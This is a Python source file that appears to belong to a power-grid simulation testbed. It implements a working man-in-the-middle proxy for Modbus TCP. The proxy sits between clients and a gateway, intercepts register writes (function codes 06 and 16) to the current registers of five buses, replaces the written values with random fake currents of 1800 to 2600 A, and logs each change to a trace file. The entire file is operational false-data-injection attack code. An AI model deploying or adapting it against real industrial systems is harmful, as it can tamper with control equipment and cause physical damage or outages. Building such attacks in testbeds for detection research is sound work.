# Di-generate dari config.yaml + topology (jangan edit manual; jalankan generator.py).
from __future__ import annotations

import os
import random
import select
import socket
import sys
import threading
import time
from typing import Optional

GATEWAY_IP = "10.0.2.2"
MODBUS_PORT = 5020
MITM_PROXY_PORT = 50201
MITM_FIXED_SEED = 424242
I_BASE_ADDR = 10
I_SCALE = 50
NUM_BUS = 5
I_INJECT_MIN_A = 1800.0
I_INJECT_MAX_A = 2600.0
RUN_ID_FILE = "/tmp/mitm_run_id"

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
MITM_LOG_DIR = os.path.join(BASE_DIR, "logs", "mitm")
MITM_TRACE_CSV = os.path.join(MITM_LOG_DIR, "mitm_trace.csv")

sys.path.append(BASE_DIR)
from logger.mitm_trace_logger import ensure_trace_csv, append_trace_row, now_ts, get_run_id  # noqa: E402


def _log_mitm_proxy_i(bus: int, i_orig: float, i_new: float, addr: int):
    append_trace_row(
        MITM_TRACE_CSV,
        [
            now_ts(),
            "mitm_proxy_i",
            get_run_id(),
            bus,
            "",
            f"{i_orig:.6f}",
            "",
            f"{i_new:.6f}",
            f"addr={addr}",
            "",
            "",
        ],
    )


def _pop_modbus_tcp_frame(buf: bytearray) -> Optional[bytes]:
    if len(buf) < 6:
        return None
    length = int.from_bytes(buf[4:6], "big")
    need = 6 + length
    if len(buf) < need:
        return None
    frame = bytes(buf[:need])
    del buf[:need]
    return frame


def _fake_i_register_value() -> int:
    i_amp = random.uniform(I_INJECT_MIN_A, I_INJECT_MAX_A)
    val = int(round(i_amp * I_SCALE))
    return min(65535, max(0, val))


def _mangle_client_to_server(frame: bytes) -> bytes:
    if len(frame) < 8:
        return frame
    length = int.from_bytes(frame[4:6], "big")
    if 6 + length > len(frame) or length < 2:
        return frame
    unit = frame[6]
    pdu = bytearray(frame[7:])
    fc = pdu[0]

    if fc == 0x06 and len(pdu) >= 5:
        addr = (pdu[1] << 8) | pdu[2]
        if I_BASE_ADDR <= addr < I_BASE_ADDR + NUM_BUS:
            old_val = (pdu[3] << 8) | pdu[4]
            i_orig = old_val / I_SCALE
            new_val = _fake_i_register_value()
            pdu[3] = (new_val >> 8) & 0xFF
            pdu[4] = new_val & 0xFF
            bus = addr - I_BASE_ADDR + 1
            _log_mitm_proxy_i(bus, i_orig, new_val / I_SCALE, addr)
            print(
                f"[mitm-proxy] FC06 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {new_val / I_SCALE:.3f}A",
                flush=True,
            )
    elif fc == 0x10 and len(pdu) >= 6:
        start = (pdu[1] << 8) | pdu[2]
        count = (pdu[3] << 8) | pdu[4]
        bytecount = pdu[5]
        if len(pdu) < 6 + bytecount or bytecount != count * 2:
            return bytes(frame)
        for i in range(count):
            addr = start + i
            if I_BASE_ADDR <= addr < I_BASE_ADDR + NUM_BUS:
                lo = 6 + 2 * i
                old_val = (pdu[lo] << 8) | pdu[lo + 1]
                i_orig = old_val / I_SCALE
                new_val = _fake_i_register_value()
                pdu[lo] = (new_val >> 8) & 0xFF
                pdu[lo + 1] = new_val & 0xFF
                bus = addr - I_BASE_ADDR + 1
                _log_mitm_proxy_i(bus, i_orig, new_val / I_SCALE, addr)
                print(
                    f"[mitm-proxy] FC16 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {new_val / I_SCALE:.3f}A",
                    flush=True,
                )

    new_len = 1 + len(pdu)
    mbap = frame[:4] + new_len.to_bytes(2, "big") + bytes([unit])
    return mbap + bytes(pdu)


def _relay_pair(client: socket.socket, upstream: socket.socket):
    cbuf = bytearray()
    try:
        while True:
            r, _, _ = select.select([client, upstream], [], [], 120.0)
            if not r:
                break
            if upstream in r:
                chunk = upstream.recv(65536)
                if not chunk:
                    break
                client.sendall(chunk)
            if client in r:
                chunk = client.recv(65536)
                if not chunk:
                    break
                cbuf.extend(chunk)
                while True:
                    adu = _pop_modbus_tcp_frame(cbuf)
                    if adu is None:
                        break
                    upstream.sendall(_mangle_client_to_server(adu))
    finally:
        for s in (client, upstream):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                s.close()
            except OSError:
                pass


def _mitm_client_handler(client: socket.socket, _addr):
    try:
        upstream = socket.create_connection((GATEWAY_IP, MODBUS_PORT), timeout=15)
        upstream.settimeout(None)
        client.settimeout(None)
        _relay_pair(client, upstream)
    except Exception as e:
        print(f"[mitm-proxy] upstream error: {e}", flush=True)
        try:
            client.close()
        except OSError:
            pass


def main():
    ensure_trace_csv(MITM_TRACE_CSV)
    random.seed(MITM_FIXED_SEED)
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("0.0.0.0", MITM_PROXY_PORT))
    ls.listen(32)
    print(
        f"[mitm-proxy] listen 0.0.0.0:{MITM_PROXY_PORT} -> {GATEWAY_IP}:{MODBUS_PORT} "
        f"I regs {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1} fixed_seed={MITM_FIXED_SEED}",
        flush=True,
    )
    while True:
        try:
            c, addr = ls.accept()
            threading.Thread(target=_mitm_client_handler, args=(c, addr), daemon=True).start()
        except Exception as e:
            print(f"[mitm-proxy] accept error: {e}", flush=True)
            time.sleep(0.5)


if __name__ == "__main__":
    main()
